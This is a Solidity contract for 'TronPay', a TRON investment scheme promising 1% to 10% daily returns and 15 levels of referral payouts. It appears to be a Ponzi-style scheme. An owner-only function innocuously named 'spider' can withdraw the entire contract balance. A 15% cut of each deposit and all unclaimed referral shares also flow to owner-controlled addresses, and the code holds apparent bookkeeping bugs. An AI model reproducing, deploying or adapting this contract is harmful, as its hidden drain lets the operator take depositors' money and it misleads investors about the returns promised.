//SourceUnit: tronpay.sol


/*



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░██░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█
█░░░░░░▄▀░░░░░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█
█████░░▄▀░░█████░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███
█████░░▄▀░░█████░░▄▀░░░░░░░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███
█████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█████░░░░▄▀░░░░█████
█████░░▄▀░░█████░░▄▀░░░░░░▄▀░░░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░███████░░▄▀░░███████
█████░░▄▀░░█████░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███████░░▄▀░░███████
█████░░▄▀░░█████░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███████░░▄▀░░███████
█████░░▄▀░░█████░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░███████░░▄▀░░███████
█████░░░░░░█████░░░░░░██░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█░░░░░░█████████░░░░░░██░░░░░░███████░░░░░░███████
██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
            
 
            
                               
    1% Per Day                                                  
    
	Fasttrack on number of directs in 30 days
	2 direct 2%
	3 direct 3%
	4 direct 4%
	5 direct 5%
	6 direct 6%
	7 direct 7%
	8 direct 8%
	9 direct 9%
	10 direct 10%
	
    15 Level referral on ROI 
    Level 1 = 10%                                                    
    Level 2 =  10%                                                   
    Level 3 =  5%                                                   
    Level 4 =  5%
    Level 5 =  5%
    Level 6 =  5%
    Level 7 =  5%
    Level 8 =  5%
    Level 9 =  2%
    Level 10 =  2%
    Level 11 =  2%
    Level 12 =  1%
    Level 13 =  1%
    Level 14 =  1%
    Level 15 =  2%
    
    // Website: http://TronPay.live

*/
pragma solidity ^0.4.25;

contract TronPay {

    using SafeMath for uint256;
    
    uint public totalPlayers;
    uint private setTron = 50000000000;
    uint public totalPayout;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 100000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private releaseTime = 1594308600;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
     
    address owner;
    struct Player {
        uint trxDeposit;
        uint time;
        uint j_time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
		uint td_teamInPeriod;
        uint td_business;
        uint reward_earned;
    }
    
    struct Preferral{
        address player_addr;
        uint aff1sum; 
        uint aff2sum;
        uint aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
        uint256 aff10sum;
    }
    
        struct PreferralExt{
        address player_addr;
        uint256 aff11sum;
        uint256 aff12sum;
        uint256 aff13sum;
        uint256 aff14sum;
        uint256 aff15sum;
    }
    
    mapping(address => Preferral) public preferals;
    mapping(address => PreferralExt) public preferralsExt;
    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;     
    }

    function register(address _addr, address _affAddr) private{
      Player storage player = players[_addr];

      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(1);
	  
	  if (now.sub(players[_affAddr].j_time) < 2592000 && msg.value >= players[_affAddr].trxDeposit) //30 days && equal and larger entry
		players[_affAddr].td_teamInPeriod =  players[_affAddr].td_teamInPeriod.add(1);
      
      setRefCount(_addr,_affAddr);      
    }

     function setRefCount(address _addr, address _affAddr) private{
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
      address _affAddr10 = players[_affAddr9].affFrom;
    
      preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
      
      if(_affAddr2 != address(0))
      {
          preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
      }

      if(_affAddr3 != address(0))
      {
         preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);        
      }

      if(_affAddr4 != address(0))
      {
          preferals[_affAddr4].aff4sum = preferals[_affAddr4].aff4sum.add(1);
      }
      
      if(_affAddr5 != address(0))
      {
        preferals[_affAddr5].aff5sum = preferals[_affAddr5].aff5sum.add(1);
      }
      if(_affAddr6 != address(0))
      {
        preferals[_affAddr6].aff6sum = preferals[_affAddr6].aff6sum.add(1);
      }
      if(_affAddr7 != address(0))
      {
        preferals[_affAddr7].aff7sum = preferals[_affAddr7].aff7sum.add(1);
      }
      if(_affAddr8 != address(0))
      {
        preferals[_affAddr8].aff8sum = preferals[_affAddr8].aff8sum.add(1);
      }
      if(_affAddr9 != address(0))
      {
        preferals[_affAddr9].aff9sum = preferals[_affAddr9].aff9sum.add(1);
      }
      if(_affAddr10 != address(0))
      {
        preferals[_affAddr10].aff10sum = preferals[_affAddr10].aff10sum.add(1);
      }
      
      setRefCountExt(_addr,_affAddr10);
     }
    

     function setRefCountExt(address _addr, address _affAddr10) private{
        PreferralExt storage preferralExt = preferralsExt[_addr];
        preferralExt.player_addr = _addr;
        
        address _affAddr11 = _affAddr10;
        address _affAddr12 = players[_affAddr11].affFrom;
        address _affAddr13 = players[_affAddr12].affFrom;
        address _affAddr14 = players[_affAddr13].affFrom;
        address _affAddr15 = players[_affAddr14].affFrom;
        
        if(_affAddr11 != address(0))
        {
            preferralsExt[_affAddr11].aff11sum = preferralsExt[_affAddr11].aff11sum.add(1);
        }
    
      if(_affAddr12 != address(0))
      {
          preferralsExt[_affAddr12].aff12sum = preferralsExt[_affAddr12].aff12sum.add(1);
      }
      if(_affAddr13 != address(0))
      {
          preferralsExt[_affAddr13].aff13sum = preferralsExt[_affAddr13].aff13sum.add(1);
      }
      if(_affAddr14 != address(0))
      {
          preferralsExt[_affAddr14].aff14sum = preferralsExt[_affAddr14].aff14sum.add(1);
      }
      if(_affAddr15 != address(0))
      {
          preferralsExt[_affAddr15].aff15sum = preferralsExt[_affAddr15].aff15sum.add(1);
      }
      
     }
    
    function deposit(address  _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        Player storage player = players[msg.sender];
		require(player.trxDeposit == 0, "deposit already made!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);

        uint depositAmount = msg.value;
        player.j_time = now;
        
        
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            
            // if affiliator is not admin as well as he deposited some amount
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
              
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        
        players[_affAddr].td_business =  players[_affAddr].td_business.add(depositAmount);          
        
        //pay rewards here
        
       uint  business = players[_affAddr].td_business;
        uint livng_time = now.sub(players[_affAddr].j_time);
        if( livng_time <=  604800)
        {
            if(business >= 100000000000)
            {
                player.reward_earned = player.reward_earned.add(2000000000);
                _affAddr.transfer(2000000000);
            }
        }
        else if(livng_time <=  1728000)
        {
            //20 day
            if(business >= 600000000000)
            {
                 player.reward_earned = player.reward_earned.add(15000000000);
                _affAddr.transfer(15000000000);
            }
        }
         else if(livng_time <=  3456000)
        {
            //40 day
            if(business >= 2100000000000)
            {
                 player.reward_earned = player.reward_earned.add(50000000000);
                _affAddr.transfer(50000000000);
            }
        }
         else if(livng_time <=  5184000)
        {
            //60 day
            if(business >= 81000000000000)
            {
                 player.reward_earned = player.reward_earned.add(200000000000);
                _affAddr.transfer(200000000000);
            }
            
        }
         else if(livng_time <=  12960000)
        {
            //150 days
            if(business >= 20100000000000)
            {
                 player.reward_earned = player.reward_earned.add(500000000000);
                _affAddr.transfer(500000000000);
            }
        }

        totalInvested = totalInvested.add(depositAmount);
        uint feedEarn = depositAmount.mul(devCommission).mul(15).div(commissionDivisor);
        feed1.transfer(feedEarn);
    }


    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

		Player storage player = players[msg.sender];
		uint withdrawal = player.interestProfit;
		
        transferPayout(msg.sender, withdrawal);
		distributeRef(withdrawal, player.affFrom);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      uint feedEarn = depositAmount.mul(devCommission).mul(15).div(commissionDivisor);
      feed1.transfer(feedEarn);

    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
			
			uint minuteRate = 0;
			//fasttrack
			if(player.td_teamInPeriod >= 10)
				minuteRate = 1182030; //10%
			else if(player.td_teamInPeriod >= 9)
				minuteRate = 1063827; //9%
			else if(player.td_teamInPeriod >= 8)
				minuteRate = 945624; //8%
			else if(player.td_teamInPeriod >= 7)
				minuteRate = 827421; //7%
			else if(player.td_teamInPeriod >= 6)
				minuteRate = 709218; //6%
			else if(player.td_teamInPeriod >= 5)
				minuteRate = 591015; //5%
			else if(player.td_teamInPeriod >= 4)
				minuteRate = 472812; //4%
			else if(player.td_teamInPeriod >= 3)
				minuteRate = 354609; //3%
			else if(player.td_teamInPeriod >= 2)
				minuteRate = 236406; //2%
			else 
				minuteRate = 118203; //1%

            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                Player storage player = players[_receiver];

				//total payout should be less than 220% of total deposit
				uint totalDeposit = player.trxDeposit;
				uint totalTargetedProfit = (totalDeposit.mul(220)).div(100); //220% of total deposit

				if (player.payoutSum >= totalTargetedProfit)
					return;

                uint payout = _amount > contractBalance ? contractBalance : _amount;
				
				//if (player.payoutSum.add(payout) > totalTargetedProfit)
				//	return;				
				
				payout = player.payoutSum.add(payout) > totalTargetedProfit ? totalTargetedProfit - player.payoutSum : payout;
				
                totalPayout = totalPayout.add(payout);
                player.payoutSum = player.payoutSum.add(payout);
				
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        //uint256 _allaff = (_trx.mul(20)).div(100);

       // address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        address _affAddr10 = players[_affAddr9].affFrom;

        uint256 _affRewards = 0;

        if (_affFrom != address(0)) {
            
            _affRewards = (_trx.mul(10)).div(100);
            
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            _affFrom.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(10)).div(100);
            
            if(players[_affAddr2].td_team >= 2)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);
                _affAddr2.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }

        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            if(players[_affAddr3].td_team >= 3)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
                _affAddr3.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            if(players[_affAddr4].td_team >= 4)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr4].affRewards = players[_affAddr4].affRewards.add(_affRewards);
                _affAddr4.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(5)).div(1000);
            if(players[_affAddr5].td_team >= 5)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr5].affRewards = players[_affAddr5].affRewards.add(_affRewards);
                _affAddr5.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
            
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(5)).div(1000);
             if(players[_affAddr6].td_team >= 6)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr6].affRewards = players[_affAddr6].affRewards.add(_affRewards);
                _affAddr6.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(5)).div(1000);
            if(players[_affAddr7].td_team >= 7)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr7].affRewards = players[_affAddr7].affRewards.add(_affRewards);
                _affAddr7.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        if (_affAddr8 != address(0)) {
            _affRewards = (_trx.mul(5)).div(1000);
            if(players[_affAddr8].td_team >= 8)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                 players[_affAddr8].affRewards = players[_affAddr8].affRewards.add(_affRewards);
                _affAddr8.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
            
        }
        if (_affAddr9 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
             if(players[_affAddr9].td_team >= 9)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr9].affRewards = players[_affAddr9].affRewards.add(_affRewards);
                _affAddr9.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }
        if (_affAddr10 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            if(players[_affAddr10].td_team >= 10)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr10].affRewards = players[_affAddr10].affRewards.add(_affRewards);
                _affAddr10.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
            
        }

        _affFrom = players[_affAddr10].affFrom;

        //_affFrom11
        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            if(players[_affFrom].td_team >= 11)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
                _affFrom.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
        }

        //_affFrom12
        _affFrom = players[_affFrom].affFrom;

        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            if(players[_affFrom].td_team >= 12)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
                _affFrom.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
        }
        
        
        //_affFrom13
        _affFrom = players[_affFrom].affFrom;

        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            if(players[_affFrom].td_team >= 13)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
                _affFrom.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
        }
        
        
        //_affFrom14
        _affFrom = players[_affFrom].affFrom;

        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            if(players[_affFrom].td_team >= 14)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
                _affFrom.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
        }
    
        
        //_affFrom15
        _affFrom = players[_affFrom].affFrom;

        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            if(players[_affFrom].td_team >= 15)
            {
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
                _affFrom.transfer(_affRewards);
            }else
            {
                owner.transfer(_affRewards);
            }
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
			
			uint minuteRate = 0;
			
			//fasttrack
			if(player.td_teamInPeriod >= 10)
				minuteRate = 1182030; //10%
			else if(player.td_teamInPeriod >= 9)
				minuteRate = 1063827; //9%
			else if(player.td_teamInPeriod >= 8)
				minuteRate = 945624; //8%
			else if(player.td_teamInPeriod >= 7)
				minuteRate = 827421; //7%
			else if(player.td_teamInPeriod >= 6)
				minuteRate = 709218; //6%
			else if(player.td_teamInPeriod >= 5)
				minuteRate = 591015; //5%
			else if(player.td_teamInPeriod >= 4)
				minuteRate = 472812; //4%
			else if(player.td_teamInPeriod >= 3)
				minuteRate = 354609; //3%
			else if(player.td_teamInPeriod >= 2)
				minuteRate = 236406; //2%
			else 
				minuteRate = 118203; //1%
	  
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
    
    
     function updateFeed1(address _address) public  {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
     function updateFeed2(address _address) public  {
       require(msg.sender==owner);
       feed2 = _address;
    }
    
    
    function spider( uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                

                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
    
    
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
     function setTronamt(uint _setTron) public {
      require(msg.sender==owner);
      setTron = _setTron;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}